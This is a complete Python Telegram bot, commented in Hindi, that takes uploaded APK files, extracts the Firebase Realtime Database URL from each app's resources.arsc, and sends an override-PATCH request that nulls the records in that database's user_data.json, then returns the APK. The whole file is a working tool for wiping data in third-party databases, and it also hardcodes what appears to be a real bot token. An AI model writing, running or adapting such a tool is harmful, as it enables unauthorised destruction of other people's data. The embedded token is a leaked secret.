import os
import re
import zipfile
import requests
import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging setup (ताकि Render logs में सब दिखता रहे)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ⚠️ यहाँ अपना Telegram Bot Token डालें (BotFather से मिला हुआ)
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY"

# Firebase को खाली/डिलीट करने के लिए Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# 1. जब कोई /start दबाएगा
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please Send Your Crash APK")

# 2. APK के resources.arsc से Firebase URL निकालने का फ़ंक्शन
def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                # RegEx: firebaseio.com वाली लिंक ढूंढने के लिए
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

# 3. Firebase REST API से डाटा डिलीट करने का फ़ंक्शन
def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'User_data.json' not in target_url:
            target_url += 'user_data.json'

        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Delete REST API Error: {e}")
        return False

# 4. जब कोई APK फाइल भेजेगा
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    
    # चेक करें कि क्या फाइल .apk है
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("कृपया केवल .apk फ़ाइल भेजें!")
        return

    status_msg = await update.message.reply_text("Downloading APK...")
    file_path = f"temp_{document.file_id}.apk"
    
    try:
        # APK डाउनलोड करें
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        await status_msg.edit_text("Extracting Firebase URL from resources.arsc...")
        
        # URL निकालें
        firebase_url = extract_firebase_url(file_path)
        
        if not firebase_url:
            await status_msg.edit_text("❌ APK में कोई Firebase Database URL नहीं मिला!")
            if os.path.exists(file_path):
                os.remove(file_path)
            return

        await status_msg.edit_text(f"URL Found: `{firebase_url}`\nDeleting Data...", parse_mode="Markdown")
        
        # डाटा डिलीट करें
        delete_success = delete_firebase_data(firebase_url)
        
        if delete_success:
            await status_msg.edit_text("✅ डेटा सफलतापूर्वक डिलीट हो गया! APK वापस भेजा जा रहा है...")
            
            # यूजर को वही APK वापस भेजें
            with open(file_path, 'rb') as apk_file:
                await update.message.reply_document(
                    document=apk_file,
                    filename=document.file_name,
                    caption="Send me Next APK"
                )
        else:
            await status_msg.edit_text("❌ Firebase से डेटा डिलीट करने में विफलता हुई!")

    except Exception as e:
        await status_msg.edit_text(f"Error: {str(e)}")

    finally:
        # काम होने के बाद फाइल डिलीट करें
        if os.path.exists(file_path):
            os.remove(file_path)

# मुख्य रनर
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logging.info("Bot is starting...")
    app.run_polling()
